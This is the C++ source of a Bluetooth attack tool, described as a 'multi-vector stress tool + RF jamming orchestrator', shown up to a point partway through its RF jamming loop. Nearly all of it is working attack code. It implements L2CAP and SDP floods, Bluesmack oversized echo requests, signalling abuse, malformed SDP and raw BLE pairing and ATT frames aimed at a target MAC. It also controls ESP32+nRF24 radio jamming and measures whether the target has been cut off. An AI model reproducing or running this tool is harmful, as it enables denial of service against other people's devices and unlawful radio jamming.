// btcpp v7 — Linux/Kali Bluetooth multi-vector stress tool + RF jamming orchestrator
//
// Build:   g++ -O2 -std=c++17 -pthread btcpp.cpp -o btcpp -lbluetooth
// Usage:   sudo ./btcpp -t <MAC> [-i iface] [-d sec] [-T thr] [-V mask]
//                        [-p serialdev] [-M BT|BLE|ALL] [-R pub|rand] [-E] [-A] [-j] [-s] [-v] [-h]
//
// Vectors (mask):
//     1 = L2CAP flood            2 = HCI create_conn
//     4 = RFCOMM hold            8 = SCO
//    16 = BLE raw ATT           32 = SDP flood
//    64 = L2CAP echo probe     128 = Bluesmack (oversized L2CAP echo request)
//   256 = L2CAP sig abuse      512 = SDP malformed query
//  1024 = BLE raw SM+ATT      2048 = RF jamming (via ESP32+nRF24 on serial port)
//
// RF vector requires external hardware: ESP32 flashed with the nrfBlueNullifier
// Enhanced v2.1 sketch (ACK protocol version), connected via USB serial.
//
// New in v7:
//   - Statistics and pacing fully separated: record() (per-vector stats) and
//     note_outcome()/evt_snapshot() (mutex-consistent global rate) with a
//     dedicated pacer thread applying AIMD. No double counting, no per-thread
//     races on the shared delay.
//   - nb_connect(): input validation (EINVAL), absolute steady_clock deadline
//     (EINTR no longer extends the timeout), validated fcntl restore on every
//     exit path, real errno preserved (saved/restored around restore()).
//   - RF control uses a structured ACK protocol: "ACK|<cmd>|<state>|<radioA>|<radioB>"
//     and "ERR|<cmd>|<reason>". Parser validates every field strictly; boolean
//     fields must be exactly "0" or "1" — anything else invalidates the message.
//   - RF status is a 5-level model (DISCONNECTED .. RF_EFFECT_VERIFIED), each
//     level only reachable after the previous one. isChipConnected() is treated
//     as "chip responds on SPI", NOT as full RF health.
//   - Efficacy probe (-E): measures independent "is the target actually cut
//     off" evidence by attempting test L2CAP connections to the target before
//     and during RF jamming. RF_EFFECT_VERIFIED is only reported when the
//     connection-failure rate rises significantly over the baseline.

#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/rfcomm.h>
#include <bluetooth/sco.h>

#include <sys/socket.h>
#include <sys/poll.h>
#include <fcntl.h>
#include <termios.h>
#include <unistd.h>
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <cstdint>
#include <cerrno>
#include <string>
#include <vector>
#include <atomic>
#include <mutex>
#include <thread>
#include <chrono>
#include <random>
#include <csignal>
#include <algorithm>
#include <getopt.h>

// =====================================================================
// Global state
// =====================================================================

static std::atomic<bool>     g_run{true};
static bdaddr_t              g_dst{};
static uint8_t               g_dst_type = BDADDR_LE_PUBLIC;
static int                   g_dev = -1;
static std::atomic<int>      g_delay_us{300};
static bool                  g_verbose = false;
static bool                  g_json = false;
static bool                  g_tune = false;
static bool                  g_efficacy = false;
static std::string           g_serial;            // e.g. /dev/ttyUSB0
static std::string           g_rfmode = "A";      // B=BT Classic, b/BLE handling below
static std::mt19937          g_rng{std::random_device{}()};

static void on_sigint(int) { g_run = false; }

static inline uint64_t now_ms() {
    return std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::steady_clock::now().time_since_epoch()).count();
}

// =====================================================================
// Statistics: per-vector counters (record) — completely separate from pacing
// =====================================================================

static constexpr int kVecCount = 12;
static std::atomic<uint64_t> g_ok[kVecCount]  = {};
static std::atomic<uint64_t> g_err[kVecCount] = {};
static std::atomic<uint64_t> g_bytes[kVecCount] = {};

static const char* vec_name[kVecCount] = {
    "l2cap", "hci", "rfcomm", "sco",
    "ble-att-raw",          // raw frames on CID 0x0004 — not real GATT operations
    "sdp", "l2echo",
    "bluesmack", "sigabuse", "sdpmal",
    "ble-sm-att-raw",       // raw Pairing Request on CID 0x0006 + raw ATT — not a real pairing
    "rf-jam"
};

// Per-vector event record. Called exactly once per attempt.
static inline void record(int vec, bool ok, uint64_t bytes = 0) {
    if (ok) { g_ok[vec]++;   g_bytes[vec] += bytes; }
    else    { g_err[vec]++; }
}

// =====================================================================
// Global outcome sampling for the pacer (mutex-consistent snapshot)
// =====================================================================

static std::mutex g_evt_mtx;
static uint64_t   g_evt_ok = 0, g_evt_all = 0;

// Hot path: one mutex acquisition per connection attempt (not per byte).
// At a few hundred ops/s this is uncontended and negligible; in exchange the
// snapshot is consistent by construction (single critical section).
static inline void note_outcome(bool ok) {
    std::lock_guard<std::mutex> lk(g_evt_mtx);
    ++g_evt_all;
    if (ok) ++g_evt_ok;
}

struct EvtSnap { uint64_t ok, all; };

static EvtSnap evt_snapshot() {           // called by pacer at 1 Hz
    std::lock_guard<std::mutex> lk(g_evt_mtx);
    return { g_evt_ok, g_evt_all };
}

// Pacer thread: single owner of g_delay_us. Global success rate, reproducible.
static void pacer_loop() {
    uint64_t prev_ok = 0, prev_all = 0;
    while (g_run) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        EvtSnap e = evt_snapshot();
        uint64_t d_ok = e.ok - prev_ok, d_all = e.all - prev_all;
        prev_ok = e.ok; prev_all = e.all;
        if (d_all < 20) continue;                       // too few samples — leave delay alone
        double r = (double)d_ok / (double)d_all;
        int d = g_delay_us.load();
        if (r > 0.6)      d = std::max(50,    d - d / 8);   // AIMD increase
        else if (r < 0.1) d = std::min(20000, d + d / 4);   // AIMD decrease
        g_delay_us.store(d);
    }
}

static inline void paced_sleep() {
    int d = g_delay_us.load(std::memory_order_relaxed);
    int j = d > 8 ? (int)(g_rng() % (uint32_t)(d / 8)) : 0;   // jitter
    std::this_thread::sleep_for(std::chrono::microseconds(d + j));
}

// =====================================================================
// nb_connect() — non-blocking connect with strict error handling
//
// Contract:
//   - s >= 0, a != nullptr, timeout_ms > 0; otherwise EINVAL (caller bug).
//   - Absolute deadline via steady_clock; EINTR retries with the REMAINING
//     time, never a full fresh timeout.
//   - fcntl restore attempted on every exit path; if restore fails, the real
//     errno is preserved, logged, and the function returns -1 (the fd is not
//     safe to hand back in a leaked state).
//   - Success requires POLLOUT observed AND SO_ERROR == 0.
//     POLLERR/POLLHUP/POLLNVAL always fail (SO_ERROR still read for the cause).
// =====================================================================

static int nb_connect(int s, const sockaddr* a, socklen_t alen, int timeout_ms) {
    // 1) Input validation
    if (s < 0 || a == nullptr || timeout_ms <= 0) {
        errno = EINVAL;
        return -1;
    }

    // 2) Validate every fcntl call
    int fl = fcntl(s, F_GETFL, 0);
    if (fl < 0) return -1;                                 // errno from fcntl preserved
    if (fcntl(s, F_SETFL, fl | O_NONBLOCK) < 0) return -1;

    int saved_errno = 0;
    auto restore = [&]() -> bool {
        if (fcntl(s, F_SETFL, fl) == 0) return true;
        saved_errno = errno;                               // real fcntl error, not a fabricated one
        return false;
    };

    int rc = ::connect(s, a, alen);
    if (rc == 0) {
        if (!restore()) {
            fprintf(stderr, "[warn] nb_connect: restore failed: %s\n",
                    strerror(saved_errno));
            errno = saved_errno;
            return -1;
        }
        return 0;
    }
    if (errno != EINPROGRESS) {
        int e = errno;
        restore();
        errno = e;
        return -1;
    }

    // 3) Absolute deadline — EINTR cannot extend the total wait
    using clock = std::chrono::steady_clock;
    auto deadline = clock::now() + std::chrono::milliseconds(timeout_ms);

    int ret = -1;
    for (;;) {
        auto now = clock::now();
        if (now >= deadline) break;                        // real timeout
        int remain_ms = (int)std::chrono::duration_cast<std::chrono::milliseconds>(
                            deadline - now).count();

        pollfd p{ s, POLLOUT, 0 };
        int pr = poll(&p, 1, remain_ms);
        if (pr < 0) {
            if (errno == EINTR) continue;                  // retry with remaining time
            break;
        }
        if (pr == 0) break;                                // timeout

        // 4) Handle per POSIX contract: any of these revents means the
        //    connect has concluded; SO_ERROR gives the definitive cause.
        if (p.revents & (POLLOUT | POLLERR | POLLHUP | POLLNVAL)) {
            int err = 0; socklen_t el = sizeof(err);
            if (getsockopt(s, SOL_SOCKET, SO_ERROR, &err, &el) != 0)
                break;                                     // can't even read the cause -> fail
            if (err == 0 && (p.revents & POLLOUT))
                ret = 0;                                   // the ONLY success condition
            // err != 0, or POLLERR/HUP without POLLOUT -> ret stays -1
        }
        break;
    }

    // 5) Restore on every path; a failed restore fails the call
    if (!restore()) {
        fprintf(stderr, "[warn] nb_connect: restore failed: %s\n",
                strerror(saved_errno));
        errno = saved_errno;
        return -1;
    }
    return ret;
}

// =====================================================================
// Socket helpers
// =====================================================================

static int l2_open() {
    int s = ::socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
    if (s >= 0) {
        struct timeval tv{0, 150000};
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    }
    return s;
}

static int l2_connect(int s, uint16_t psm, uint16_t cid) {
    sockaddr_l2 a{};
    a.l2_family  = AF_BLUETOOTH;
    a.l2_bdaddr  = g_dst;
    a.l2_psm     = htobs(psm);
    a.l2_cid     = htobs(cid);
    return nb_connect(s, (sockaddr*)&a, sizeof(a), 200);
}

static int l2_connect_ble(int s, uint16_t cid) {
    sockaddr_l2 a{};
    a.l2_family      = AF_BLUETOOTH;
    a.l2_bdaddr      = g_dst;
    a.l2_bdaddr_type = g_dst_type;
    a.l2_cid         = htobs(cid);
    return nb_connect(s, (sockaddr*)&a, sizeof(a), 200);
}

// =====================================================================
// Adapter management
// =====================================================================

static void tune_adapter(int dev_id) {
    if (!g_tune) return;
    int ctl = hci_open_dev(dev_id);
    if (ctl < 0) return;
    {
        write_scan_enable_cp cp; cp.enable = SCAN_PAGE | SCAN_INQUIRY;
        struct hci_request rq{}; memset(&rq, 0, sizeof(rq));
        rq.ogf = OGF_HOST_CTL; rq.ocf = OCF_WRITE_SCAN_ENABLE;
        rq.cparam = &cp; rq.clen = WRITE_SCAN_ENABLE_CP_SIZE;
        hci_send_req(ctl, &rq, 1000);
    }
    {
        write_page_timeout_cp cp; cp.timeout = htobs(0x2000);
        struct hci_request rq{}; memset(&rq, 0, sizeof(rq));
        rq.ogf = OGF_HOST_CTL; rq.ocf = OCF_WRITE_PAGE_TIMEOUT;
        rq.cparam = &cp; rq.clen = WRITE_PAGE_TIMEOUT_CP_SIZE;
        hci_send_req(ctl, &rq, 1000);
    }
    hci_close_dev(ctl);
}

static void restore_adapter(int dev_id) {
    int ctl = hci_open_dev(dev_id);
    if (ctl < 0) return;
    write_scan_enable_cp cp; cp.enable = 0;
    struct hci_request rq{}; memset(&rq, 0, sizeof(rq));
    rq.ogf = OGF_HOST_CTL; rq.ocf = OCF_WRITE_SCAN_ENABLE;
    rq.cparam = &cp; rq.clen = WRITE_SCAN_ENABLE_CP_SIZE;
    hci_send_req(ctl, &rq, 1000);
    hci_close_dev(ctl);
}

static void do_scan(int dev_id) {
    printf("[*] Scanning (8s inquiry)...\n");
    inquiry_info ii[32] = {};
    int n = hci_inquiry(dev_id, 8, 32, nullptr, ii, IREQ_CACHE_FLUSH);
    if (n < 0) { printf("[-] inquiry failed\n"); return; }
    char addr[19] = {}, name[248] = {};
    int ctl = hci_open_dev(dev_id);
    for (int i = 0; i < n; i++) {
        ba2str(&ii[i].bdaddr, addr); name[0] = 0;
        if (ctl >= 0) hci_read_remote_name(ctl, &ii[i].bdaddr, sizeof(name), name, 1000);
        printf("  %s  %s\n", addr, name[0] ? name : "(unknown)");
    }
    if (ctl >= 0) hci_close_dev(ctl);
    printf("[*] %d device(s) found\n", n);
}

// =====================================================================
// Efficacy probe — independent measurement of "is the target cut off?"
//
// Method: attempt small L2CAP connections to the target and measure the
// failure rate. A rising failure rate DURING jamming vs. the baseline is
// independent evidence that RF disruption is affecting the link.
// =====================================================================

static std::atomic<uint64_t> g_probe_try{0}, g_probe_fail{0};

static bool probe_once() {
    int s = l2_open();
    if (s < 0) return false;
    bool ok = (l2_connect(s, 0x0001, 0x0001) == 0);
    ::close(s);
    g_probe_try++;
    if (!ok) g_probe_fail++;
    return ok;
}

static void efficacy_baseline(int seconds) {
    // Sample ~1 probe/second for min(seconds/4, 10) seconds before jamming
    int n = std::max(3, std::min(10, seconds / 4));
    printf("[*] Efficacy baseline: %d probe attempts...\n", n);
    for (int i = 0; i < n && g_run; i++) {
        probe_once();
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    uint64_t t = g_probe_try.load(), f = g_probe_fail.load();
    printf("[*] Baseline: %llu/%llu probes failed (%.0f%%)\n",
           (unsigned long long)f, (unsigned long long)t,
           t ? 100.0 * f / t : 0.0);
}

static double efficacy_current() {
    uint64_t t = g_probe_try.load(), f = g_probe_fail.load();
    return t ? 100.0 * f / t : 0.0;
}

// =====================================================================
// Protocol vectors
// =====================================================================

// vec 0 (mask 1): L2CAP flood
static void vec_l2cap() {
    static thread_local uint8_t payload[672];
    memset(payload, 0x41, sizeof(payload));
    while (g_run) {
        int s = l2_open();
        if (s < 0) { record(0, false); note_outcome(false); paced_sleep(); continue; }
        if (l2_connect(s, 0x0001, 0x0001) == 0) {
            for (int i = 0; i < 6 && g_run; ++i) {
                ssize_t n = ::send(s, payload, sizeof(payload), MSG_DONTWAIT);
                if (n > 0) { record(0, true, n); note_outcome(true); }
                else { record(0, false); note_outcome(false); break; }
            }
        } else { record(0, false); note_outcome(false); }
        ::close(s); paced_sleep();
    }
}

// vec 1 (mask 2): HCI create_conn
static void vec_hci_conn() {
    int ctl = hci_open_dev(g_dev);
    while (g_run) {
        if (ctl < 0) ctl = hci_open_dev(g_dev);
        if (ctl < 0) { record(1, false); note_outcome(false); paced_sleep(); continue; }
        create_conn_cp cp;
        memset(&cp, 0, sizeof(cp));
        cp.bdaddr = g_dst; cp.pkt_type = htobs(0xCC18);
        cp.pscan_rep_mode = 0x02; cp.pscan_mode = 0x00;
        cp.clock_offset = 0x0000; cp.role_switch = 0x01;
        struct hci_request rq;
        memset(&rq, 0, sizeof(rq));
        rq.ogf = OGF_LINK_CTL; rq.ocf = OCF_CREATE_CONN;
        rq.cparam = &cp; rq.clen = CREATE_CONN_CP_SIZE;
        bool ok = (hci_send_req(ctl, &rq, 1200) == 0);
        record(1, ok); note_outcome(ok);
        paced_sleep();
    }
    if (ctl >= 0) hci_close_dev(ctl);
}

// vec 2 (mask 4): RFCOMM hold
static void vec_rfcomm() {
    int ch = 1;
    std::vector<int> held;
    while (g_run) {
        int s = ::socket(PF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);
        if (s < 0) { record(2, false); note_outcome(false); paced_sleep(); continue; }
        struct timeval tv{0, 150000};
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        sockaddr_rc a{};
        a.rc_family  = AF_BLUETOOTH;
        a.rc_bdaddr  = g_dst;
        a.rc_channel = (uint8_t)ch;
        ch = (ch % 30) + 1;
        if (nb_connect(s, (sockaddr*)&a, sizeof(a), 250) == 0) {
            uint8_t junk[64]; memset(junk, 0x41, sizeof(junk));
            ssize_t n = ::send(s, junk, sizeof(junk), MSG_DONTWAIT);
            if (n > 0) { record(2, true, n); note_outcome(true); }
            if (held.size() < 16) {
                int ka = 1;
                setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &ka, sizeof(ka));
                held.push_back(s);
            } else { ::close(s); held.erase(held.begin()); }
        } else { record(2, false); note_outcome(false); ::close(s); }
        paced_sleep();
    }
    for (int s : held) { uint8_t b = 0; ::send(s, &b, 1, MSG_NOSIGNAL); ::close(s); }
}

// vec 3 (mask 8): SCO
static void vec_sco() {
    while (g_run) {
        int s = ::socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_SCO);
        if (s < 0) { record(3, false); note_outcome(false); paced_sleep(); continue; }
        sockaddr_sco a{};
        a.sco_family = AF_BLUETOOTH; a.sco_bdaddr = g_dst;
        if (nb_connect(s, (sockaddr*)&a, sizeof(a), 250) == 0) {
            uint8_t v[48]; memset(v, 0, sizeof(v));
            ssize_t n = ::send(s, v, sizeof(v), MSG_DONTWAIT);
            bool ok = (n > 0);
            record(3, ok, ok ? (uint64_t)n : 0); note_outcome(ok);
        } else { record(3, false); note_outcome(false); }
        ::close(s); paced_sleep();
    }
}

// vec 4 (mask 16): raw ATT frames on CID 0x0004
// NOTE: raw malformed frames on the ATT channel — this does NOT perform real
// GATT reads/writes and does not verify any GATT response.
static void vec_ble_att_raw() {
    static thread_local uint8_t payload[200];
    memset(payload, 0x42, sizeof(payload));
    while (g_run) {
        int s = ::socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
        if (s < 0) { record(4, false); note_outcome(false); paced_sleep(); continue; }
        if (l2_connect_ble(s, 0x0004) == 0) {
            ssize_t n = ::send(s, payload, sizeof(payload), MSG_DONTWAIT);
            bool ok = (n > 0);
            record(4, ok, ok ? (uint64_t)n : 0); note_outcome(ok);
        } else { record(4, false); note_outcome(false); }
        ::close(s); paced_sleep();
    }
}

// vec 5 (mask 32): SDP flood
static void vec_sdp_flood() {
    static thread_local uint8_t req[1024];
    memset(req, 0x41, sizeof(req));
    req[0] = 0x02; req[1] = 0x00; req[2] = 0x01;
    req[3] = 0x00; req[4] = 0x04;
    req[5] = 0xFF; req[6] = 0xFF;
    while (g_run) {
        int s = l2_open();
        if (s < 0) { record(5, false); note_outcome(false); paced_sleep(); continue; }
        if (l2_connect(s, 0x0001, 0x0001) == 0) {
            for (int i = 0; i < 4 && g_run; ++i) {
                ssize_t n = ::send(s, req, sizeof(req), MSG_DONTWAIT);
                if (n > 0) { record(5, true, n); note_outcome(true); }
                else { record(5, false); note_outcome(false); break; }
            }
        } else { record(5, false); note_outcome(false); }
        ::close(s); paced_sleep();
    }
}

// vec 6 (mask 64): L2CAP echo/MTU probe
static void vec_l2cap_echo() {
    static thread_local uint8_t ping[1024];
    memset(ping, 0x5A, sizeof(ping));
    while (g_run) {
        int s = l2_open();
        if (s < 0) { record(6, false); note_outcome(false); paced_sleep(); continue; }
        if (l2_connect(s, 0, 0x0045) == 0) {
            ssize_t n = ::send(s, ping, sizeof(ping), MSG_DONTWAIT);
            bool ok = (n > 0);
            record(6, ok, ok ? (uint64_t)n : 0); note_outcome(ok);
        } else { record(6, false); note_outcome(false); }
        ::close(s); paced_sleep();
    }
}

// vec 7 (mask 128): Bluesmack — oversized L2CAP Echo Request
static void vec_bluesmack() {
    static thread_local uint8_t pkt[2048];
    memset(pkt, 0x42, sizeof(pkt));
    pkt[0] = 0x08;                              // Echo Request
    pkt[1] = 0x01;                              // identifier
    pkt[2] = (2040 & 0xFF); pkt[3] = (2040 >> 8);
    while (g_run) {
        int s = l2_open();
        if (s < 0) { record(7, false); note_outcome(false); paced_sleep(); continue; }
        if (l2_connect(s, 0x0001, 0x0001) == 0) {
            ssize_t n = ::send(s, pkt, sizeof(pkt), MSG_DONTWAIT);
            bool ok = (n > 0);
            record(7, ok, ok ? (uint64_t)n : 0); note_outcome(ok);
        } else { record(7, false); note_outcome(false); }
        ::close(s); paced_sleep();
    }
}

// vec 8 (mask 256): L2CAP signaling abuse — repeated identifier, alternating PDUs
static void vec_l2cap_sigabuse() {
    static thread_local uint8_t req[64];
    while (g_run) {
        int s = l2_open();
        if (s < 0) { record(8, false); note_outcome(false); paced_sleep(); continue; }
        if (l2_connect(s, 0x0001, 0x0001) == 0) {
            for (int i = 0; i < 8 && g_run; ++i) {
                memset(req, 0, sizeof(req));
                req[0] = (i % 2 == 0) ? 0x08 : 0x02;
                req[1] = 0x01;                  // SAME identifier every time
                req[2] = 0x04; req[3] = 0x00;
                if (req[0] == 0x02) {
                    req[4] = 0x0E; req[5] = 0x00;
                    req[6] = 0x40; req[7] = 0x00;
                } else {
                    req[4] = 0x41; req[5] = 0x41;
                    req[6] = 0x41; req[7] = 0x41;
                }
                ssize_t n = ::send(s, req, 8, MSG_DONTWAIT);
                if (n > 0) { record(8, true, n); note_outcome(true); }
                else { record(8, false); note_outcome(false); break; }
                std::this_thread::sleep_for(std::chrono::microseconds(200));
            }
        } else { record(8, false); note_outcome(false); }
        ::close(s); paced_sleep();
    }
}

// vec 9 (mask 512): SDP malformed queries
static void vec_sdp_malformed() {
    static thread_local uint8_t req[256];
    while (g_run) {
        int s = l2_open();
        if (s < 0) { record(9, false); note_outcome(false); paced_sleep(); continue; }
        if (l2_connect(s, 0x0001, 0x0001) == 0) {
            // Variant 1: ServiceAttributeRequest, oversized attr list, missing continuation state
            memset(req, 0, sizeof(req));
            req[0] = 0x04;
            req[1] = 0x00; req[2] = 0x01;
            req[3] = 0x00; req[4] = 0xFA;
            req[5] = 0x00; req[6] = 0x01; req[7] = 0x00; req[8] = 0x01;
            req[9] = 0xFF; req[10] = 0xFA;
            memset(&req[11], 0x41, 200);
            ssize_t n = ::send(s, req, 211, MSG_DONTWAIT);
            bool ok = (n > 0);
            record(9, ok, ok ? (uint64_t)n : 0); note_outcome(ok);

            // Variant 2: ServiceSearchRequest, uuid-count lies about content
            memset(req, 0, sizeof(req));
            req[0] = 0x02;
            req[1] = 0x00; req[2] = 0x02;
            req[3] = 0x00; req[4] = 0x08;
            req[5] = 0x03; req[6] = 0x00;
            n = ::send(s, req, 7, MSG_DONTWAIT);
            ok = (n > 0);
            record(9, ok, ok ? (uint64_t)n : 0); note_outcome(ok);
        } else { record(9, false); note_outcome(false); }
        ::close(s); paced_sleep();
    }
}

// vec 10 (mask 1024): raw SMP Pairing Request + raw ATT frames
// NOTE: this does NOT run the SMP state machine and does not track pairing
// responses; its effect is limited to embedded stacks that misbehave when
// bombarded with repeated raw SM requests.
static void vec_ble_sm_att_raw() {
    static thread_local uint8_t sm[6] = {0x01, 0x05, 0x0D, 0x08, 0x00, 0x00};
    static thread_local uint8_t att_rd[3] = {0x0A, 0x01, 0x00};
    static thread_local uint8_t att_wr[32];
    att_wr[0] = 0x12; att_wr[1] = 0x01; att_wr[2] = 0x00;
    memset(&att_wr[3], 0x41, 29);

    while (g_run) {
        // Raw Pairing Request on the SMP channel (CID 0x0006)
        int s = ::socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
        if (s >= 0) {
            if (l2_connect_ble(s, 0x0006) == 0) {
                ssize_t n = ::send(s, sm, 6, MSG_DONTWAIT);
                bool ok = (n > 0);
                record(10, ok, ok ? (uint64_t)n : 0); note_outcome(ok);
            } else { record(10, false); note_outcome(false); }
            ::close(s);
        } else { record(10, false); note_outcome(false); }
        paced_sleep();

        // Raw ATT frames on CID 0x0004
        s = ::socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
        if (s >= 0) {
            if (l2_connect_ble(s, 0x0004) == 0) {
                for (int i = 0; i < 5 && g_run; ++i) {
                    uint8_t* p = (i % 2 == 0) ? att_rd : att_wr;
                    size_t   l = (i % 2 == 0) ? 3 : 32;
                    ssize_t n = ::send(s, p, l, MSG_DONTWAIT);
                    if (n > 0) { record(10, true, n); note_outcome(true); }
                    else { record(10, false); note_outcome(false); break; }
                }
            } else { record(10, false); note_outcome(false); }
            ::close(s);
        } else { record(10, false); note_outcome(false); }
        paced_sleep();
    }
}

// =====================================================================
// RF jamming via ESP32+nRF24 — structured ACK protocol
//
// Wire protocol (115200 8N1):
//   Command (host -> ESP32):  single byte 'B' | 'T' | 'A' | 'S'
//   ACK     (ESP32 -> host):  "ACK|<cmd>|<state>|<radioA>|<radioB>\n"
//   Error   (ESP32 -> host):  "ERR|<cmd>|<reason>\n"
//
// Every boolean field must be exactly "0" or "1"; anything else invalidates
// the whole message (distinguishing "false" from "malformed").
// =====================================================================

// RF status levels — each level requires the previous one. Never claim more
// than what was independently verified.
enum class RfLevel {
    DISCONNECTED       = 0,  // serial port could not be opened
    SERIAL_CONNECTED   = 1,  // fd is open
    FIRMWARE_RESPONSIVE = 2, // structured ACK with the correct cmd field received
    RADIO_DETECTED      = 3, // ACK reports both chips respond on SPI (isChipConnected)
    RF_EFFECT_VERIFIED  = 4  // efficacy probe shows failure-rate rise over baseline
};

static std::atomic<RfLevel> g_rf_level{RfLevel::DISCONNECTED};

static const char* rf_level_name(RfLevel l) {
    switch (l) {
        case RfLevel::DISCONNECTED:        return "DISCONNECTED";
        case RfLevel::SERIAL_CONNECTED:    return "SERIAL_CONNECTED";
        case RfLevel::FIRMWARE_RESPONSIVE: return "FIRMWARE_RESPONSIVE";
        case RfLevel::RADIO_DETECTED:      return "RADIO_DETECTED";
        case RfLevel::RF_EFFECT_VERIFIED:  return "RF_EFFECT_VERIFIED";
    }
    return "?";
}

struct RfAck {
    bool        valid    = false;   // well-formed message, all fields in range
    bool        is_err   = false;   // ERR|<cmd>|<reason>
    char        cmd      = 0;       // field 2: exact command identifier
    bool        state_ok = false;   // field 3: mode was actually set
    bool        radio_a  = false;   // field 4
    bool        radio_b  = false;   // field 5
    std::string raw;
};

// Strict boolean field: only exactly "0" or "1" accepted.
static bool parse_bool_field(const std::string& v, bool& out) {
    if (v == "1") { out = true;  return true; }
    if (v == "0") { out = false; return true; }
    return false;                                  // malformed -> reject whole message
}

static bool rf_parse_line(const std::string& line, char expect_cmd, RfAck& out) {
    out = {}; out.raw = line;

    std::vector<std::string> f;
    size_t start = 0;
    while (true) {
        size_t p = line.find('|', start);
        if (p == std::string::npos) { f.push_back(line.substr(start)); break; }
        f.push_back(line.substr(start, p - start));
        start = p + 1;
    }

    if (f.size() == 3 && f[0] == "ERR") {          // ERR|<cmd>|<reason>
        out.is_err = true;
        out.cmd = (f[1].size() == 1) ? f[1][0] : '?';
        return out.cmd == expect_cmd;              // only this command's error
    }
    if (f.size() != 5 || f[0] != "ACK") return false;
    if (f[1].size() != 1 || f[1][0] != expect_cmd) return false;   // exact cmd match

    if (!parse_bool_field(f[2], out.state_ok)) return false;
    if (!parse_bool_field(f[3], out.radio_a))  return false;
    if (!parse_bool_field(f[4], out.radio_b))  return false;

    out.cmd   = expect_cmd;
    out.valid = true;
    return true;
}

// Wait for a response line belonging to this command; discard anything else
// (boot logs, stale lines). Absolute deadline, like nb_connect.
static bool rf_expect_ack(int fd, char cmd, RfAck& ack, int timeout_ms) {
    if (fd < 0 || timeout_ms <= 0) { errno = EINVAL; return false; }
    using clock = std::chrono::steady_clock;
    auto deadline = clock::now() + std::chrono::milliseconds(timeout_ms);
    std::string acc;
    while (clock::now() < deadline) {
        char tmp[256];
        int r = ::read(fd, tmp, sizeof(tmp) - 1);
        if (r > 0) {
            tmp[r] = 0; acc += tmp;
            size_t pos;
            while ((pos = acc.find('\n')) != std::string::npos) {
                std::string line = acc.substr(0, pos);
                acc.erase(0, pos + 1);
                if (rf_parse_line(line, cmd, ack)) return true;
                // non-matching lines (boot garbage, other cmds) are discarded
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(20));
    }
    return false;   // deadline passed without a valid ACK -> real failure
}

static int serial_open(const std::string& dev) {
    int fd = ::open(dev.c_str(), O_RDWR | O_NOCTTY | O_NONBLOCK);
    if (fd < 0) return -1;
    termios tty{};
    if (tcgetattr(fd, &tty) != 0) { ::close(fd); return -1; }
    cfsetospeed(&tty, B115200);
    cfsetispeed(&tty, B115200);
    tty.c_cflag = (tty.c_cflag & ~CSIZE) | CS8;
    tty.c_cflag &= ~(PARENB | CSTOPB | CRTSCTS);
    tty.c_cflag |= (CLOCAL | CREAD);
    tty.c_lflag &= ~(ICANON | ECHO | ECHOE | ISIG);
    tty.c_iflag &= ~(IXON | IXOFF | IXANY | ICRNL | INLCR);
    tty.c_oflag &= ~OPOST;
    tty.c_cc[VMIN]  = 0;
    tty.c_cc[VTIME] = 1;
    if (tcsetattr(fd, TCSANOW, &tty) != 0) { ::close(fd); return -1; }
    return fd;
}

// vec 11 (mask 2048): RF jamming via serial-controlled ESP32+nRF24
static void vec_rf_serial() {
    if (g_serial.empty()) {
        printf("[-] RF vector selected but no serial port given (-p /dev/ttyUSB0)\n");
        return;
    }
    int fd = serial_open(g_serial);
    if (fd < 0) {
        printf("[-] RF: cannot open serial port '%s' (level: DISCONNECTED)\n",
               g_serial.c_str());
        record(11, false); return;
    }
    g_rf_level = RfLevel::SERIAL_CONNECTED;
    printf("[*] RF: %s\n", rf_level_name(g_rf_level.load()));

    // Allow ESP32 boot if freshly plugged, then drain boot garbage
    std::this_thread::sleep_for(std::chrono::milliseconds(1500));
    char buf[256];
    while (::read(fd, buf, sizeof(buf)) > 0) {}

    char cmd = g_rfmode.empty() ? 'A' : (char)toupper((unsigned char)g_rfmode[0]);
    if (cmd != 'B' && cmd != 'T' && cmd != 'A') cmd = 'A';

    if (::write(fd, &cmd, 1) != 1) {
        record(11, false); ::close(fd); return;
    }

    RfAck ack;
    if (!rf_expect_ack(fd, cmd, ack, 1500)) {
        printf("[-] RF: no valid ACK for '%c' within 1.5s "
               "(firmware not running or old sketch without ACK protocol)\n", cmd);
        record(11, false); ::close(fd); return;   // stays at SERIAL_CONNECTED
    }
    if (ack.is_err) {
        printf("[-] RF: firmware rejected '%c' (%s)\n", cmd, ack.raw.c_str());
        record(11, false); ::close(fd); return;
    }
    if (!ack.state_ok) {
        printf("[-] RF: firmware ACKed but mode was NOT set (%s)\n", ack.raw.c_str());
        record(11, false); ::close(fd); return;
    }
    g_rf_level = RfLevel::FIRMWARE_RESPONSIVE;
    record(11, true, 1);

    if (ack.radio_a && ack.radio_b) {
        g_rf_level = RfLevel::RADIO_DETECTED;
        printf("[+] RF: %s (mode %c, both radio chips respond on SPI)\n",
               rf_level_name(g_rf_level.load()), cmd);
        printf("[!] Note: RADIO_DETECTED means chips answer on SPI — it does NOT\n"
               "    prove antenna integrity, PA health, or actual RF effect.\n");
    } else {
        printf("[!] RF: %s but radioA=%d radioB=%d — check wiring/power on the\n"
               "    failing radio before trusting any jamming effect\n",
               rf_level_name(g_rf_level.load()), ack.radio_a, ack.radio_b);
    }
    if (g_verbose) printf("[rf] %s\n", ack.raw.c_str());

    // Efficacy probe: independent verification
    uint64_t base_try = g_probe_try.load(), base_fail = g_probe_fail.load();
    uint64_t keep_last = now_ms();

    while (g_run) {
